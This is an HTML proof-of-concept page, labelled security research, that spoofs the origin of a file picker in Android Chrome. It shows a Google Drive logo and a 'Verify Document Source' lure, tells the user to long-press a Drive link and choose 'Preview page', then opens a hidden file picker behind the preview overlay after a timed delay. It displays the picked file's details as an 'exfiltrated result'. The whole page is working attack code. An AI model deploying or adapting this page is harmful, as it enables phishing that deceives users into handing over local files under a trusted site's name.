<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Security Research - File Picker Spoofing</title>
    <style>
      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial,
          sans-serif;
        text-align: center;
        background: #f8f9fa;
        padding: 20px;
      }
      .container {
        max-width: 500px;
        margin: 50px auto;
        background: white;
        padding: 40px;
        border-radius: 12px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      }
      .logo {
        width: 60px;
        margin-bottom: 20px;
      }
      h2 {
        color: #202124;
        font-size: 22px;
      }
      p {
        color: #5f6368;
        line-height: 1.6;
      }

      #trigger-link {
        display: block;
        width: 100%;
        margin: 30px 0;
        padding: 16px;
        background: #1a73e8;
        color: white;
        text-decoration: none;
        border-radius: 8px;
        font-weight: bold;
        font-size: 16px;
        transition: background 0.2s;
      }

      #status-box {
        margin-top: 20px;
        padding: 15px;
        border-radius: 8px;
        font-size: 14px;
      }
      .waiting {
        background: #e8f0fe;
        color: #1967d2;
      }
      .success {
        background: #e6f4ea;
        color: #137333;
        border: 1px solid #137333;
      }

      input[type="file"] {
        display: none;
      }
      #preview-area {
        display: none;
        margin-top: 20px;
        text-align: left;
        border-top: 1px solid #eee;
        padding-top: 20px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
        class="logo"
        alt="Drive"
      />
      <h2>Verify Document Source</h2>
      <p>
        To view the encrypted file, please perform the following interaction:
      </p>

      <!-- User must Long-Press this link -->
      <a id="trigger-link" href="https://drive.google.com/">
        Hold here & select "Preview page"
      </a>

      <div id="status-box" class="waiting">
        Status: Waiting for interaction...
      </div>

      <input
        id="hiddenFilePicker"
        type="file"
        accept="image/*, application/pdf"
      />

      <div id="preview-area">
        <strong style="color: #d93025">Exfiltrated Result:</strong>
        <pre
          id="file-output"
          style="
            background: #f1f3f4;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
          "
        ></pre>
      </div>
    </div>

    <script>
      const triggerLink = document.getElementById("trigger-link");
      const hiddenFilePicker = document.getElementById("hiddenFilePicker");
      const statusBox = document.getElementById("status-box");
      const previewArea = document.getElementById("preview-area");
      const fileOutput = document.getElementById("file-output");

      // Step 1: Detect the Long-Press (Context Menu)
      triggerLink.addEventListener("contextmenu", function () {
        statusBox.innerText =
          "Interaction detected. Launching race condition...";

        // Step 2: The Race Condition
        // 4 seconds is usually the "sweet spot" for a user to long-press
        // and then tap "Preview page" in the Android Chrome UI.
        setTimeout(function () {
          hiddenFilePicker.click();
          console.log("File picker triggered behind the Preview overlay.");
          statusBox.innerText = "Payload triggered. Check overlay.";
        }, 4000);
      });

      // Step 3: Handle the 'Stolen' File
      hiddenFilePicker.onchange = function (e) {
        const file = e.target.files[0];
        if (file) {
          statusBox.className = "success";
          statusBox.innerText = "SUCCESS: Origin Spoofing Confirmed.";
          previewArea.style.display = "block";
          fileOutput.innerText =
            `Name: ${file.name}\n` +
            `Size: ${file.size} bytes\n` +
            `Type: ${file.type}\n` +
            `Last Modified: ${new Date(file.lastModified).toLocaleString()}`;
        }
      };
    </script>
  </body>
</html>
